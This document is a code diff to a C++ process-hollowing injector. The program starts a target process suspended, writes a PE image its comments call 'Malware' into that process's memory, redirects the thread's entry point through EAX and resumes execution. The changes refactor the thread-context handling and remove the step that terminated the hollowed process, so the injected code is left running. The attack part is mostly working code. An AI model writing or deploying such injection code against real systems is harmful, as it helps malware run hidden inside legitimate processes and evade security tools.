@@ -21,7 +21,7 @@ int main() {
 		NULL,
 		NULL,
 		NULL,
-		TRUE,
+		FALSE,
 		CREATE_SUSPENDED,
 		NULL,
 		NULL,
@@ -83,24 +83,23 @@ int main() {
 	}
 
 
-	//Close open Malware object handle.
-	CloseHandle(malware);
 	std::cout << "[+] Wrote Malware into memory at: 0x" << malwareImage << std::endl;
 
 
-	CONTEXT c{};
+	CONTEXT context = CONTEXT();
+	context.ContextFlags = CONTEXT_INTEGER;
 
 
 	//Using context structure pointer c to pull thread context for target process.
-	c.ContextFlags = CONTEXT_INTEGER;
-	GetThreadContext(processInfo->hThread, &c);
+	GetThreadContext(processInfo->hThread, &context);
 
+	DWORD PEBAddr = context.Ebx;
 
 	//Find base address of Target process
-	PVOID targetBaseAddress = nullptr;
+	PVOID targetBaseAddress = 0;
 	ReadProcessMemory(
 		processInfo->hProcess,
-		(PVOID)(c.Ebx + 8),
+		LPVOID(PEBAddr + 8),
 		&targetBaseAddress,
 		sizeof(PVOID),
 		0
@@ -156,6 +155,7 @@ int main() {
 
 	std::cout << "[+] Memory allocated at: 0x" << hollow << std::endl;
 
+	SIZE_T writtenBytes = 0;
 
 	//write malware headers into target memory
 	if (!WriteProcessMemory(
@@ -163,7 +163,7 @@ int main() {
 		targetBaseAddress,
 		malwareImage,
 		NTHeaders->OptionalHeader.SizeOfHeaders,
-		NULL
+		&writtenBytes
 	)) {
 		std::cout << "[!] Writing Headers failed. Error: " << GetLastError() << std::endl;
 	}
@@ -187,13 +187,15 @@ int main() {
 
 	//change EAX value from thread context to the entry point of the Malware process that's been injected.
 	//ResumeThread() takes the created process out of the suspended state from createProcess().
-	c.Eax = (SIZE_T)((LPBYTE)hollow + NTHeaders->OptionalHeader.AddressOfEntryPoint);
+	context.Eax = (SIZE_T)((LPBYTE)hollow + NTHeaders->OptionalHeader.AddressOfEntryPoint);
 
-	SetThreadContext(processInfo->hThread, &c);
+	SetThreadContext(processInfo->hThread, &context);
 	ResumeThread(processInfo->hThread);
 
-	system("pause");
-	TerminateProcess(processInfo->hProcess, 0);
+	CloseHandle(processInfo->hProcess);
+	CloseHandle(processInfo->hThread);
+
+	
 
 	return 0;
 
